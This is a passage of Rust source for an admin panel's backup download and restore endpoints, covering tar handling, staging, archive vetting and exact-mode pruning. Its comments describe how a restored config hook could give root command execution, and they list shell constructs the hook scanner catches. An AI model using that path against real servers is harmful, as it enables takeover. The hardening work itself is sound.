use crate::server::web::auth::{self, AuthError};
use axum::body::{Body, Bytes};
use axum::http::{header, HeaderValue, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::Json;
use serde_json::json;
use std::path::{Component, Path};
use std::time::{SystemTime, UNIX_EPOCH};

const MANAGED_BACKUP_ROOT: &str = "/etc/qeli";
const TRANSIENT_TAR_EXCLUDES: &[&str] = &[
    "qeli/.pre-restore-*.tgz",
    "qeli/.restore-upload-*.tgz",
    "qeli/.restore-staging-*",
];
const PORTABLE_TAR_EXCLUDES: &[&str] = &[
    "qeli/.config-history",
    // The legacy key can remain after migration to /var/lib/qeli. Never export it beside the
    // encrypted password values: the portable archive deliberately excludes encryption keys.
    "qeli/panel-secret.key",
];

fn append_tar_excludes(command: &mut std::process::Command, portable: bool) {
    for pattern in TRANSIENT_TAR_EXCLUDES {
        command.arg(format!("--exclude={pattern}"));
    }
    if portable {
        for pattern in PORTABLE_TAR_EXCLUDES {
            command.arg(format!("--exclude={pattern}"));
        }
    }
}

fn validate_critical_sources(paths: &[CriticalBackupPath]) -> Result<(), String> {
    for item in paths {
        let path = Path::new("/etc").join(&item.archive_path);
        let metadata = std::fs::symlink_metadata(&path).map_err(|error| {
            format!(
                "backup aborted: '{}' is unavailable ({}) — {error}",
                path.display(),
                item.reason
            )
        })?;
        if !metadata.file_type().is_file() {
            return Err(format!(
                "backup aborted: '{}' is not a regular file ({})",
                path.display(),
                item.reason
            ));
        }
        std::fs::File::open(&path).map_err(|error| {
            format!(
                "backup aborted: '{}' is unreadable ({}) — {error}",
                path.display(),
                item.reason
            )
        })?;
    }
    Ok(())
}

fn inspect_backup_archive(
    bytes: Vec<u8>,
) -> Result<(Vec<u8>, std::collections::HashSet<String>), String> {
    use std::io::Write;
    use std::process::Stdio;

    let mut child = std::process::Command::new("tar")
        .args(["tzf", "-"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|error| format!("cannot inspect generated backup: {error}"))?;
    let mut stdin = child
        .stdin
        .take()
        .ok_or_else(|| "cannot open tar stdin for backup verification".to_string())?;
    let writer = std::thread::spawn(move || {
        let result = stdin.write_all(&bytes);
        (bytes, result)
    });
    let listing = child
        .wait_with_output()
        .map_err(|error| format!("cannot wait for backup verification: {error}"))?;
    let (bytes, write_result) = writer
        .join()
        .map_err(|_| "backup verification writer panicked".to_string())?;
    write_result.map_err(|error| format!("cannot feed generated backup to tar: {error}"))?;
    if !listing.status.success() {
        return Err(format!(
            "generated backup cannot be listed: {}",
            String::from_utf8_lossy(&listing.stderr).trim()
        ));
    }
    let members = String::from_utf8_lossy(&listing.stdout)
        .lines()
        .map(|line| {
            line.trim()
                .trim_start_matches("./")
                .trim_end_matches('/')
                .to_string()
        })
        .filter(|line| !line.is_empty())
        .collect();
    Ok((bytes, members))
}

#[derive(Debug)]
struct CriticalBackupPath {
    archive_path: String,
    reason: &'static str,
}

/// Map an active configuration path to the member name used by the portable panel archive.
/// The panel archive deliberately has one managed root. Silently accepting a path outside
/// that root is worse than refusing the operation: the resulting archive looks complete but
/// cannot reproduce the running server.
fn managed_archive_path(path: &str, label: &str) -> Result<String, String> {
    let path = Path::new(path);
    if !path.is_absolute() {
        return Err(format!(
            "panel backup unavailable: active {label} path '{}' is relative; move it below {MANAGED_BACKUP_ROOT} or take a manual backup",
            path.display()
        ));
    }
    let relative = path.strip_prefix(MANAGED_BACKUP_ROOT).map_err(|_| {
        format!(
            "panel backup unavailable: active {label} path '{}' is outside {MANAGED_BACKUP_ROOT}; the panel will not claim that a partial archive is complete. Move it below {MANAGED_BACKUP_ROOT} or take a manual backup that includes the external path",
            path.display()
        )
    })?;
    if relative.as_os_str().is_empty()
        || !relative
            .components()
            .all(|component| matches!(component, Component::Normal(_)))
    {
        return Err(format!(
            "panel backup unavailable: active {label} path '{}' is not a normal file below {MANAGED_BACKUP_ROOT}",
            path.display()
        ));
    }
    Ok(format!(
        "qeli/{}",
        relative.to_string_lossy().replace('\\', "/")
    ))
}

fn critical_backup_paths(
    config: &crate::config::server::ServerConfig,
    config_path: &str,
) -> Result<Vec<CriticalBackupPath>, String> {
    let mut paths = vec![CriticalBackupPath {
        archive_path: managed_archive_path(config_path, "server config")?,
        reason: "the active server configuration",
    }];
    paths.push(CriticalBackupPath {
        archive_path: managed_archive_path(&config.auth.users_file, "users database")?,
        reason: "the active users database",
    });
    for profile in &config.profiles {
        paths.push(CriticalBackupPath {
            archive_path: managed_archive_path(
                &crate::server::profile_identity_path(profile),
                &format!("identity key for profile '{}'", profile.name),
            )?,
            reason: "a server identity key; restoring without it would break pinned clients",
        });
    }
    if config.web.tls {
        for (path, label) in [
            (
                if config.web.tls_cert.is_empty() {
                    "/etc/qeli/web-tls-cert.pem"
                } else {
                    &config.web.tls_cert
                },
                "panel TLS certificate",
            ),
            (
                if config.web.tls_key.is_empty() {
                    "/etc/qeli/web-tls-key.pem"
                } else {
                    &config.web.tls_key
                },
                "panel TLS private key",
            ),
        ] {
            paths.push(CriticalBackupPath {
                archive_path: managed_archive_path(path, label)?,
                reason: "the active panel TLS material",
            });
        }
    }
    paths.sort_by(|a, b| a.archive_path.cmp(&b.archive_path));
    paths.dedup_by(|a, b| a.archive_path == b.archive_path);
    Ok(paths)
}

/// Stream a gzip tarball of `/etc/qeli` (config + users file + identity keys) for
/// off-box backup. Authed-admin only; a GET so the browser downloads it straight
/// to disk carrying the session cookie. Restore = extract it back into `/etc`
/// (`tar xzf qeli-backup-*.tar.gz -C /etc`) and restart.
pub async fn download_backup(
    axum::extract::State(state): axum::extract::State<std::sync::Arc<crate::server::ServerState>>,
    _guard: auth::AuthGuard,
) -> Result<Response, AuthError> {
    let config_path = state
        .config_path
        .lock()
        .await
        .clone()
        .unwrap_or_else(|| "/etc/qeli/server.conf".to_string());
    let critical_paths = match critical_backup_paths(&state.config, &config_path) {
        Ok(paths) => paths,
        Err(error) => return Ok((StatusCode::CONFLICT, error).into_response()),
    };
    if let Err(error) = validate_critical_sources(&critical_paths) {
        return Ok((StatusCode::INTERNAL_SERVER_ERROR, error).into_response());
    }
    let out = tokio::task::spawn_blocking(|| {
        // Non-critical local artefacts may be unreadable; the critical set is preflighted and
        // then verified against the actual archive member list below.
        let mut command = std::process::Command::new("tar");
        command.args(["czf", "-", "--ignore-failed-read", "--xattrs"]);
        append_tar_excludes(&mut command, true);
        command.args(["-C", "/etc", "qeli"]).output()
    })
    .await;

    // tar exits non-zero (1/2) when it skipped unreadable files, yet still produces
    // a valid archive — accept any non-empty gzip stream (magic 1f 8b).
    let is_gzip = |b: &[u8]| b.len() > 2 && b[0] == 0x1f && b[1] == 0x8b;
    let o = match out {
        Ok(Ok(o)) => o,
        Ok(Err(e)) => {
            return Ok((
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("tar spawn error: {e}"),
            )
                .into_response())
        }
        Err(e) => {
            return Ok((
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("task error: {e}"),
            )
                .into_response())
        }
    };
    if !is_gzip(&o.stdout) {
        return Ok((
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("tar failed: {}", String::from_utf8_lossy(&o.stderr)),
        )
            .into_response());
    }
    // Do not infer completeness from tar stderr: an already-missing path need not be named.
    // List the archive that will actually be returned and require every runtime dependency.
    let tar_stderr = String::from_utf8_lossy(&o.stderr).trim().to_string();
    let inspected = tokio::task::spawn_blocking(move || inspect_backup_archive(o.stdout)).await;
    let (bytes, members) = match inspected {
        Ok(Ok(value)) => value,
        Ok(Err(error)) => return Ok((StatusCode::INTERNAL_SERVER_ERROR, error).into_response()),
        Err(error) => {
            return Ok((
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("backup verification task failed: {error}"),
            )
                .into_response())
        }
    };
    if let Some(item) = critical_paths
        .iter()
        .find(|item| !members.contains(&item.archive_path))
    {
        return Ok((
            StatusCode::INTERNAL_SERVER_ERROR,
            format!(
                "backup aborted: '{}' is MISSING from the generated archive ({}). tar: {}",
                item.archive_path, item.reason, tar_stderr
            ),
        )
            .into_response());
    }

    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let fname = format!("qeli-backup-{ts}.tar.gz");
    let mut resp = Response::new(Body::from(bytes));
    let h = resp.headers_mut();
    h.insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("application/gzip"),
    );
    if let Ok(v) = HeaderValue::from_str(&format!("attachment; filename=\"{fname}\"")) {
        h.insert(header::CONTENT_DISPOSITION, v);
    }
    Ok(resp)
}

/// Query string for `POST /api/restore`. (Р1)
#[derive(serde::Deserialize)]
pub struct RestoreQuery {
    /// `true`/`1` → exact restore: files present in /etc/qeli but absent from the archive
    /// are DELETED, so the result matches the backup rather than being a union with it.
    /// Absent/false → overlay (the historical, non-destructive behaviour).
    #[serde(default, deserialize_with = "de_flexible_bool")]
    pub exact: Option<bool>,
}

/// Accept `1/0`, `true/false`, `yes/no` — a query param arrives as a string, and
/// `?exact=1` is what a curl user will type.
fn de_flexible_bool<'de, D>(d: D) -> Result<Option<bool>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    use serde::Deserialize as _;
    let s = Option::<String>::deserialize(d)?;
    Ok(s.map(|v| {
        matches!(
            v.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        )
    }))
}

/// Sentinel for "a restore is already running" so the handler can answer 409 without
/// re-deriving it from prose. (S-08)
const RESTORE_BUSY: &str = "another restore is already in progress — retry once it finishes";

/// Failures that are the SERVER's fault (it could not run tar, create the staging dir,
/// or publish) rather than the uploaded archive's. Everything else a restore rejects is
/// a property of the upload — bad gzip, traversal, empty, refused content — and is a
/// 400. Listed in one place instead of threading a status through ~15 return sites; the
/// strings are ours and live next to the code that emits them. (S-13)
const SERVER_FAULT_MARKERS: &[&str] = &[
    "write temp file",
    "tar list failed",
    "tar extract spawn failed",
    "cannot create the staging directory",
    "publishing the restored files failed",
    "could not run tar for the pre-restore snapshot",
    "could not take the pre-restore snapshot",
    "staged tree unreadable",
    "cannot normalize restored config/key permissions",
];

fn restore_error_status(msg: &str) -> StatusCode {
    if msg == RESTORE_BUSY {
        StatusCode::CONFLICT
    } else if SERVER_FAULT_MARKERS.iter().any(|m| msg.contains(m)) {
        StatusCode::INTERNAL_SERVER_ERROR
    } else {
        StatusCode::BAD_REQUEST
    }
}

/// Restore `/etc/qeli` from an uploaded backup `.tar.gz` (the file produced by
/// `download_backup`). The body is the raw gzip. Before extracting it validates
/// the archive is a gzip whose entries ALL live under `qeli/` (no absolute paths
/// or `..` traversal), then snapshots the current directory to a pre-restore
/// archive so the change is reversible. The worker must be restarted to apply.
///
/// NOTE: extraction is an OVERLAY — files present in the live directory but absent
/// from the archive are left in place, not deleted (see the success message). (S-13)
pub async fn restore_backup(
    axum::extract::State(state): axum::extract::State<std::sync::Arc<crate::server::ServerState>>,
    _guard: auth::AuthGuard,
    axum::extract::Query(q): axum::extract::Query<RestoreQuery>,
    body: Bytes,
) -> Result<Response, AuthError> {
    let config_path = state
        .config_path
        .lock()
        .await
        .clone()
        .unwrap_or_else(|| "/etc/qeli/server.conf".to_string());
    if let Err(error) = critical_backup_paths(&state.config, &config_path) {
        return Ok((
            StatusCode::CONFLICT,
            Json(json!({
                "ok": false,
                "error": format!("restore unavailable: {error}")
            })),
        )
            .into_response());
    }
    // A restore replaces the same files as Configuration/Quick Start. Keep it mutually
    // exclusive with those read-modify-write operations so neither can publish a stale tree
    // over the other while extraction and validation are in progress.
    let _config_write_guard = state.config_write_lock.lock().await;
    // `?exact=1` opts into deleting live files the archive does not contain. Default stays
    // OVERLAY: exact restore removes data, and that must never be what a plain "Restore"
    // click does. (Р1)
    let exact = q.exact.unwrap_or(false);
    let result =
        tokio::task::spawn_blocking(move || restore_blocking(&body, exact, &config_path)).await;
    // A failed restore used to answer 200 {ok:false}: the panel rendered the error, but
    // every non-browser caller (curl, a deploy script, uptime monitoring) read "success".
    // The body shape is unchanged — the panel's apiFetch parses JSON on any status. (S-13)
    let (status, payload) = match result {
        Ok(Ok(msg)) => {
            // Notify (Tier-3): a successful restore changed /etc/qeli on disk.
            tokio::spawn(async {
                crate::server::notify::fire(
                    crate::server::notify::Event::Restore,
                    "config restored from an uploaded backup",
                )
                .await;
            });
            (StatusCode::OK, json!({ "ok": true, "message": msg }))
        }
        Ok(Err(e)) => (restore_error_status(&e), json!({ "ok": false, "error": e })),
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            json!({ "ok": false, "error": format!("task error: {e}") }),
        ),
    };
    Ok((status, Json(payload)).into_response())
}

/// Serialises restores inside this process. Two restores running at once interleave
/// snapshot → stage → publish over the SAME live directory, so the loser can publish
/// half of the winner's tree; the per-restore names below stop them sharing paths, but
/// only a lock stops them sharing /etc/qeli itself. Poisoning is irrelevant (the guard
/// holds no data), so a poisoned lock is recovered rather than propagated. (S-08)
static RESTORE_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

/// Distinguishes restores that start within the same second (the old names used only a
/// unix-seconds stamp, and the temp file added a pid that is identical for two requests
/// in the same process — so both collided). (S-08)
static RESTORE_SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

/// Delete everything in `/etc/qeli` that the archive did not contain, so the result is
/// the backup rather than a union of the backup and whatever is live. (Р1)
///
/// Skips, deliberately:
///  * `.pre-restore-*.tgz` — the snapshot taken moments ago is the ONLY way back from a
///    bad exact restore. Deleting our own safety net would be self-defeating.
///  * `.restore-upload-*` / `.restore-staging-*` — in-flight artefacts of this or a
///    concurrent operation, never part of a backup.
///  * dotfiles in general are left alone: they are operational state, and no backup
///    contains them (the tarball excludes them), so "absent from the archive" says
///    nothing about whether they are wanted.
///
/// Returns the number of entries removed. Errors are collected, not fatal: a partial
/// cleanup with a warning beats aborting after the files were already published.
///
/// `archive_names` MUST be captured BEFORE publishing. `publish_staged_tree` moves entries
/// out of the staging directory with `fs::rename`, so by the time this runs the staging
/// tree no longer contains the files it just delivered. Testing "is it still in staging?"
/// therefore answered "no" for everything and deleted `server.conf`, `users.conf` and
/// profile identity keys moments after restoring them — while the endpoint reported success.
fn prune_absent(
    archive_names: &std::collections::HashSet<String>,
    dest: &str,
) -> (usize, Vec<String>) {
    let mut removed = 0usize;
    let mut errors = Vec::new();
    // Fail closed: with no idea what the archive held, deleting "everything not in it"
    // would delete everything.
    if archive_names.is_empty() {
        return (
            0,
            vec!["refusing to prune: the archive's file list is empty/unreadable".into()],
        );
    }
    let entries = match std::fs::read_dir(dest) {
        Ok(e) => e,
        Err(e) => return (0, vec![format!("cannot scan {dest}: {e}")]),
    };
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        if name.starts_with('.') {
            continue; // snapshots, in-flight restore artefacts, operational dotfiles
        }
        if archive_names.contains(&name) {
            continue; // present in the archive — keep (publish already overwrote it)
        }
        let path = entry.path();
        let is_dir = entry.metadata().map(|m| m.is_dir()).unwrap_or(false);
        let r = if is_dir {
            std::fs::remove_dir_all(&path)
        } else {
            std::fs::remove_file(&path)
        };
        match r {
            Ok(()) => removed += 1,
            Err(e) => errors.push(format!("{name}: {e}")),
        }
    }
    (removed, errors)
}

#[path = "backup_listing.rs"]
mod listing;

fn restore_blocking(data: &[u8], exact: bool, config_path: &str) -> Result<String, String> {
    if data.len() < 3 || data[0] != 0x1f || data[1] != 0x8b {
        return Err("not a gzip archive".into());
    }
    // Refuse rather than queue: a restore rewrites /etc/qeli, and an operator who fired
    // two by accident wants to hear about it, not to have them applied back to back.
    let _restore_guard = match RESTORE_LOCK.try_lock() {
        Ok(g) => g,
        Err(std::sync::TryLockError::Poisoned(p)) => p.into_inner(),
        Err(std::sync::TryLockError::WouldBlock) => {
            return Err(RESTORE_BUSY.into());
        }
    };
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    // Unique per restore: seconds + pid + an in-process counter. Every temporary path
    // below (upload, snapshot, staging dir) is derived from this. (S-08)
    let uniq = format!(
        "{ts}-{}-{}",
        std::process::id(),
        RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
    );
    let tmp = &format!("/etc/qeli/.restore-upload-{uniq}.tgz");
    // Born 0600: the uploaded archive contains identity keys + user hashes, so it
    // must not be world-readable in the write window or after a crash.
    crate::util::write_atomic_private(tmp, data).map_err(|e| format!("write temp file: {e}"))?;
    let cleanup = || {
        let _ = std::fs::remove_file(tmp);
    };

    // The listing is consumed with bounded memory, entry/expanded-byte budgets and
    // a deadline. Stop tar (and gzip) before a hostile archive can grow its output.
    let count = match listing::validate_archive(tmp) {
        Ok(count) => count,
        Err(error) => {
            cleanup();
            return Err(error);
        }
    };

    // Snapshot the current state so a bad restore is reversible. If this fails there is
    // no way back, so refuse the restore rather than proceed unprotected — the whole
    // point of the snapshot is that the operator can undo a bad archive.
    let bak = format!("/etc/qeli/.pre-restore-{uniq}.tgz");
    // Create the snapshot file 0600 BEFORE tar writes into it. tar creates it with the
    // process umask (0644 in practice) and the chmod below only ran once the archive was
    // COMPLETE — so for the whole duration of the archiving, a file containing the identity
    // keys and every user's password hash sat world-readable. Opening an existing file with
    // O_TRUNC does not change its mode, so pre-creating it closes that window without
    // changing how tar is invoked.
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        if let Err(e) = std::fs::OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .mode(0o600)
            .open(&bak)
        {
            cleanup();
            return Err(format!(
                "refusing to restore: could not pre-create the pre-restore snapshot ({e})"
            ));
        }
    }
    let snapshot = {
        let mut command = std::process::Command::new("tar");
        command.args(["czf", &bak, "--ignore-failed-read", "--xattrs"]);
        // Never archive the output file, prior snapshots, uploads or staging directories.
        append_tar_excludes(&mut command, false);
        command.args(["-C", "/etc", "qeli"]).output()
    };
    match snapshot {
        Ok(o) if o.status.success() => {}
        Ok(o) => {
            cleanup();
            return Err(format!(
                "refusing to restore: could not take the pre-restore snapshot ({}) — without \
                 it the change would be irreversible",
                String::from_utf8_lossy(&o.stderr).trim()
            ));
        }
        Err(e) => {
            cleanup();
            return Err(format!(
                "refusing to restore: could not run tar for the pre-restore snapshot ({e})"
            ));
        }
    }
    // The snapshot holds identity keys + user hashes — keep it admin-only, and
    // rotate old ones so repeated restores don't grow /etc/qeli without bound.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&bak, std::fs::Permissions::from_mode(0o600));
    }
    prune_pre_restore_snapshots(5);

    // Extract into a STAGING directory, never straight into /etc/qeli. The checks above
    // are structural (paths, links, bomb) and say nothing about CONTENT — and content is
    // the dangerous part: `routing.post_up` is run through `/bin/sh -c` at profile start
    // (see hooks.rs), so extracting an attacker's config in place turned an authenticated
    // panel session into command execution on the next restart. It also bypassed the
    // deliberate rule that `PUT /config` enforces — hooks are file-only, the panel may
    // never set them. Staging lets us apply that same rule to a restore before anything
    // reaches the live directory.
    let staging = format!("/etc/qeli/.restore-staging-{uniq}");
    let _ = std::fs::remove_dir_all(&staging);
    // Staging briefly holds the extracted identity keys / user hashes — create it
    // 0700 so no local user can read them out of it mid-restore.
    let mk_staging = {
        #[cfg(unix)]
        {
            use std::os::unix::fs::DirBuilderExt;
            std::fs::DirBuilder::new().mode(0o700).create(&staging)
        }
        #[cfg(not(unix))]
        {
            std::fs::create_dir(&staging)
        }
    };
    if let Err(e) = mk_staging {
        cleanup();
        return Err(format!("cannot create the staging directory: {e}"));
    }
    let stage_cleanup = || {
        let _ = std::fs::remove_dir_all(&staging);
    };
    let ex = std::process::Command::new("tar")
        .args(["xzf", tmp, "--xattrs", "-C", &staging])
        .output();
    cleanup();
    match ex {
        Ok(o) if o.status.success() => {}
        Ok(o) => {
            stage_cleanup();
            return Err(format!(
                "extract failed: {}",
                String::from_utf8_lossy(&o.stderr)
            ));
        }
        Err(e) => {
            stage_cleanup();
            return Err(format!("tar extract spawn failed: {e}"));
        }
    }

    let staged_root = format!("{staging}/qeli");
    if let Err(e) = vet_staged_tree(&staged_root, config_path) {
        stage_cleanup();
        return Err(e);
    }
    if let Err(error) = normalize_staged_permissions(std::path::Path::new(&staged_root)) {
        stage_cleanup();
        return Err(format!(
            "cannot normalize restored config/key permissions: {error}"
        ));
    }
    if let Err(e) = vet_publish_shape(
        std::path::Path::new(&staged_root),
        std::path::Path::new("/etc/qeli"),
        exact,
        0,
    ) {
        stage_cleanup();
        return Err(e);
    }

    // Snapshot the archive's TOP-LEVEL names BEFORE publishing: publish moves entries out
    // of staging (fs::rename), so afterwards the staging tree is no longer a record of what
    // the archive contained. Reading it later reported "the archive has nothing" and pruned
    // away the very files that had just been restored. (Р1)
    let archive_names: std::collections::HashSet<String> = match std::fs::read_dir(&staged_root) {
        Ok(rd) => rd
            .flatten()
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .collect(),
        Err(e) => {
            stage_cleanup();
            return Err(format!("staged tree unreadable: {e}"));
        }
    };

    // Vetted — publish. Same filesystem, so each rename is atomic; a failure part-way
    // leaves the rest of the live directory intact and the pre-restore snapshot above
    // restores the whole thing.
    if let Err(e) = publish_staged_tree(&staged_root, "/etc/qeli") {
        stage_cleanup();
        return Err(format!("publishing the restored files failed: {e}"));
    }
    // Exact mode: drop what the archive did not carry. Done AFTER publish, so a failure
    // during publish leaves the live directory intact rather than half-deleted. (Р1)
    let mut pruned = String::new();
    if exact {
        let (removed, errors) = prune_absent(&archive_names, "/etc/qeli");
        pruned = format!(" Removed {removed} item(s) not present in the archive.");
        if !errors.is_empty() {
            pruned.push_str(&format!(
                " WARNING: {} item(s) could not be removed: {}.",
                errors.len(),
                errors.join("; ")
            ));
        }
    }
    stage_cleanup();
    // Spell out which semantics actually ran. Operators reasonably read "restore" as "put
    // it back exactly as it was", and the default does NOT do that — anything created
    // after the backup survives. (S-13)
    let mode = if exact {
        "EXACT restore — files absent from the archive were deleted."
    } else {
        "This is an OVERLAY — files that exist now but are NOT in the archive were left in \
         place, so anything created after the backup survives. Re-run with `?exact=1` for a \
         true rollback."
    };
    Ok(format!(
        "restored {count} file(s) into /etc/qeli (pre-restore backup saved to {bak}).{pruned} \
         {mode} Restart the server to apply."
    ))
}

/// Reject a staged tree whose CONTENT would be unsafe to publish.
///
/// Two rules, both mirroring controls that already exist elsewhere:
///  * hooks are file-only — a restored config may not introduce or change
///    `post_up`/`post_down` (server) or `password_command` (client profile) relative to
///    what is live today. This is exactly what `PUT /config` enforces; restore was the
///    one panel path that skipped it, and it is the link that made the chain RCE.
///  * a restored server config must still pass `validate_profiles`, so a restore cannot
///    leave the worker crash-looping on a config the panel happily accepted.
///
/// Files under `/etc/qeli` that an EXISTING hook would execute.
///
/// The hook rule enforced in `vet_config_file` stops a restore introducing or changing a
/// hook COMMAND. It does nothing about the script that command points AT: if the live
/// config already has `post_up = /etc/qeli/up.sh`, an archive can ship a new `up.sh`,
/// leave the config byte-identical, and the panel has just written code that runs as root
/// on the next profile start. That is precisely the panel-compromise-to-RCE step the
/// file-only hook rule exists to prevent, so the paths are collected here and refused.
///
/// Only paths inside `/etc/qeli` matter — a hook pointing outside it is not something a
/// restore can reach (and the docs already recommend keeping hooks there).
fn hook_referenced_files(config_path: &str) -> std::collections::HashSet<String> {
    let mut out = std::collections::HashSet::new();
    let mut add = |cmd: &str| {
        // `script_paths` parses the command STRUCTURALLY — first token, or the first
        // non-flag argument of a known interpreter — and gives up early on `-c`. The hook
        // itself is run through `/bin/sh -c`, so `A && sh B`, `. B`, `$(cat B)` and friends
        // all reference files it never returns. Since the point of this set is "do not let
        // a restore overwrite anything a root hook will read", scan the raw command text for
        // /etc/qeli/ paths as well and union the two. Over-blocking here only means an
        // operator has to move a file; under-blocking means panel access becomes root
        // execution. (Audit 2026-08-04.)
        let mut candidates: Vec<String> = crate::hooks::script_paths(cmd);
        let needle = "/etc/qeli/";
        let mut rest = cmd;
        while let Some(i) = rest.find(needle) {
            let tail = &rest[i..];
            let end = tail
                .find(|c: char| {
                    c.is_whitespace() || matches!(c, '"' | '\'' | ';' | '&' | '|' | ')')
                })
                .unwrap_or(tail.len());
            candidates.push(tail[..end].to_string());
            rest = &tail[end.max(1)..];
        }
        for p in candidates {
            if let Some(rest) = p.strip_prefix("/etc/qeli/") {
                // Store the TOP-LEVEL name: publishing works entry by entry, and a hook
                // pointing at `/etc/qeli/scripts/up.sh` is blocked by refusing `scripts`.
                if let Some(top) = rest.split('/').next().filter(|t| !t.is_empty()) {
                    out.insert(top.to_string());
                }
            }
        }
    };
    // The LIVE config path, not a hard-coded one.
    //
    // This read `/etc/qeli/server.conf` literally, so a server started with
    // `-c /etc/qeli/qeli.conf` — or any other name — produced an EMPTY set and the whole
    // gate went inert, silently. `ServerState::config_path` is what every other part of the
    // server uses. (Audit 2026-08-04.)
    if let Ok(text) = std::fs::read_to_string(config_path) {
        if let Ok(cfg) = crate::config::parse_server_config(&text) {
            for p in &cfg.profiles {
                add(&p.routing.post_up);
                add(&p.routing.post_down);
            }
        }
    }
    out
}

/// Return a safe, normal-component path relative to `/etc/qeli`. Parent traversal,
/// an additional root, or a platform prefix are not archive members and are rejected.
fn qeli_relative_path(path: &str) -> Option<std::path::PathBuf> {
    let relative = std::path::Path::new(path).strip_prefix("/etc/qeli").ok()?;
    if relative.as_os_str().is_empty()
        || !relative
            .components()
            .all(|component| matches!(component, std::path::Component::Normal(_)))
    {
        None
    } else {
        Some(relative.to_path_buf())
    }
}

fn vet_staged_tree(root: &str, config_path: &str) -> Result<(), String> {
    // The live server accepts an arbitrary config filename.  Validate that exact
    // staged path as a server config even when it is `server.ini`/`qeli.cfg`; an
    // extension-based gate is not a security boundary.
    let config_is_under_qeli = std::path::Path::new(config_path)
        .strip_prefix("/etc/qeli")
        .is_ok();
    if config_is_under_qeli && qeli_relative_path(config_path).is_none() {
        return Err(format!(
            "refused: active server config path '{config_path}' is not a normal path below /etc/qeli"
        ));
    }
    if let Some(relative) = qeli_relative_path(config_path) {
        let staged_path = std::path::Path::new(root).join(&relative);
        if staged_path.is_file() {
            let staged = std::fs::read_to_string(&staged_path)
                .map_err(|e| format!("cannot read staged '{}': {e}", relative.display()))?;
            let live = std::fs::read_to_string(config_path).unwrap_or_default();
            vet_server_config(&relative.to_string_lossy(), &staged, &live)?;

            // The restored main config is authoritative. Runtime merges its external users
            // database with inline users/groups, so the external dependency is mandatory even
            // when inline entries exist. Otherwise restore silently loses part of the ACL.
            let staged_config = crate::config::parse_server_config(&staged).map_err(|e| {
                format!(
                    "refused: active server config '{}' could not be parsed after validation: {e}",
                    relative.display()
                )
            })?;
            let users_claims_qeli = std::path::Path::new(&staged_config.auth.users_file)
                .strip_prefix("/etc/qeli")
                .is_ok();
            if users_claims_qeli && qeli_relative_path(&staged_config.auth.users_file).is_none() {
                return Err(format!(
                    "refused: active server config '{}' contains unsafe users_file path '{}'",
                    relative.display(),
                    staged_config.auth.users_file
                ));
            }
            if let Some(users_relative) = qeli_relative_path(&staged_config.auth.users_file) {
                let users_path = std::path::Path::new(root).join(&users_relative);
                if users_path.is_file() {
                    let content = std::fs::read_to_string(&users_path).map_err(|e| {
                        format!(
                            "cannot read staged users database '{}': {e}",
                            users_relative.display()
                        )
                    })?;
                    crate::config::users::UsersDb::parse_strict(&content, &users_relative)
                        .map_err(|e| {
                            format!(
                                "refused: users database '{}' is invalid: {e}",
                                users_relative.display()
                            )
                        })?;
                } else {
                    return Err(format!(
                        "refused: active server config '{}' requires users database '{}', but the archive does not contain it",
                        relative.display(),
                        users_relative.display()
                    ));
                }
            } else {
                // Restore cannot replace a users file outside /etc/qeli, but a newly
                // restored main config can start referring to one. Validate the actual
                // dependency now; load_users_db refuses an existing corrupt file even
                // when inline users are also present.
                match crate::config::users::UsersDb::load(&staged_config.auth.users_file) {
                    Ok(_) => {}
                    Err(error) => {
                        return Err(format!(
                            "refused: active server config '{}' refers to unusable users database '{}': {error}",
                            relative.display(),
                            staged_config.auth.users_file
                        ));
                    }
                }
            }
        } else {
            return Err(format!(
                "refused: archive does not contain the active server config '{}'",
                relative.display()
            ));
        }
    }
    let hook_files = hook_referenced_files(config_path);
    vet_staged_dir(std::path::Path::new(root), &hook_files)
}

#[cfg(unix)]
fn normalize_staged_permissions(root: &std::path::Path) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;

    for entry in std::fs::read_dir(root)? {
        let entry = entry?;
        let path = entry.path();
        let metadata = entry.metadata()?;
        if metadata.is_dir() {
            normalize_staged_permissions(&path)?;
        } else {
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600))?;
        }
    }
    std::fs::set_permissions(root, std::fs::Permissions::from_mode(0o700))
}

#[cfg(not(unix))]
fn normalize_staged_permissions(_root: &std::path::Path) -> std::io::Result<()> {
    Ok(())
}
fn vet_staged_dir(
    root: &std::path::Path,
    hook_files: &std::collections::HashSet<String>,
) -> Result<(), String> {
    let entries = std::fs::read_dir(root).map_err(|e| format!("staged tree unreadable: {e}"))?;
    for entry in entries.flatten() {
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().into_owned();
        // Refuse to replace a file an existing hook executes — see hook_referenced_files.
        if hook_files.contains(&name) {
            return Err(format!(
                "refused: '{name}' is executed by a routing.post_up/post_down hook in the live                  config. Replacing it through a restore would run panel-supplied code as root,                  which the file-only hook rule exists to prevent. Update it on the server, or                  point the hook outside /etc/qeli."
            ));
        }
        let md = match entry.metadata() {
            Ok(m) => m,
            Err(e) => return Err(format!("cannot stat staged '{name}': {e}")),
        };
        if md.is_dir() {
            // identity/ and friends: recurse, same rules.
